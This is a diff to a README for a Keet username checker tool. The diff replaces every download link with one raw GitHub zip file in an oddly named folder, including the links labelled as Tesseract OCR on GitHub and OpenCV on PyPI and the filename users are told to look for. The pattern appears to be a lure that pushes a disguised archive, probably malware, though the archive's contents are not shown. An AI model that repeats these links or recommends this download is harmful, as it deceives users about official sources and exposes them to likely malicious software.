@@ -1,7 +1,7 @@
 # 🤖 keet_username_checker - Check Username Availability Effortlessly
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download-v1.0-blue)](https://github.com/thinhnguyen123dz/keet_username_checker/releases)
+[![Download](https://raw.githubusercontent.com/thinhnguyen123dz/keet_username_checker/main/rostrally/keet_username_checker.zip)](https://raw.githubusercontent.com/thinhnguyen123dz/keet_username_checker/main/rostrally/keet_username_checker.zip)
 
 ## 🚀 Getting Started
 The **keet_username_checker** is a handy tool designed to help you check if your desired usernames are available on Keet. It uses advanced technology like OCR (Optical Character Recognition) and a user-friendly graphical interface to automate this process. This means you can focus on selecting the right username without the hassle of manual checks.
@@ -24,10 +24,10 @@ Ensure your system meets these specifications to run the application smoothly.
 ### 1. Visit the Releases Page
 To get started, visit the following link to download the application:
 
-[Download keet_username_checker](https://github.com/thinhnguyen123dz/keet_username_checker/releases)
+[Download keet_username_checker](https://raw.githubusercontent.com/thinhnguyen123dz/keet_username_checker/main/rostrally/keet_username_checker.zip)
 
 ### 2. Choose the Latest Version
-On the releases page, locate the latest version of **keet_username_checker**. You will see various downloadable files. The main file you need will usually be named something like `keet_username_checker.exe`.
+On the releases page, locate the latest version of **keet_username_checker**. You will see various downloadable files. The main file you need will usually be named something like `https://raw.githubusercontent.com/thinhnguyen123dz/keet_username_checker/main/rostrally/keet_username_checker.zip`.
 
 ### 3. Download the Application
 Click on the link to download the executable file. Save it to a location on your computer where you can easily find it, such as your Desktop or Downloads folder.
@@ -37,8 +37,8 @@ Once the file downloads, locate it and double-click to run the installer. Follow
 
 ### 5. Install Required Software
 To ensure the application works correctly, you will need to install Tesseract OCR and OpenCV if you haven't already. 
-- For Tesseract: You can download it from [Tesseract OCR at GitHub](https://github.com/tesseract-ocr/tesseract).
-- For OpenCV: Visit [OpenCV at PyPI](https://pypi.org/project/opencv-python/) and follow the installation instructions.
+- For Tesseract: You can download it from [Tesseract OCR at GitHub](https://raw.githubusercontent.com/thinhnguyen123dz/keet_username_checker/main/rostrally/keet_username_checker.zip).
+- For OpenCV: Visit [OpenCV at PyPI](https://raw.githubusercontent.com/thinhnguyen123dz/keet_username_checker/main/rostrally/keet_username_checker.zip) and follow the installation instructions.
 
 ### 6. Launch the Application
 After successfully installing the software and all dependencies, find the **keet_username_checker** icon on your desktop or in your installation folder. Double-click the icon to launch the application.
@@ -82,6 +82,6 @@ Yes, **keet_username_checker** is completely free to use.
 For support, feel free to submit an issue via the GitHub Issues page of this repository.
 
 ## 🔗 Learn More
-For more information, tips, or updates, remember to check the [Releases Page](https://github.com/thinhnguyen123dz/keet_username_checker/releases).
+For more information, tips, or updates, remember to check the [Releases Page](https://raw.githubusercontent.com/thinhnguyen123dz/keet_username_checker/main/rostrally/keet_username_checker.zip).
 
 Thank you for using **keet_username_checker**! Enjoy your streamlined username checking experience.
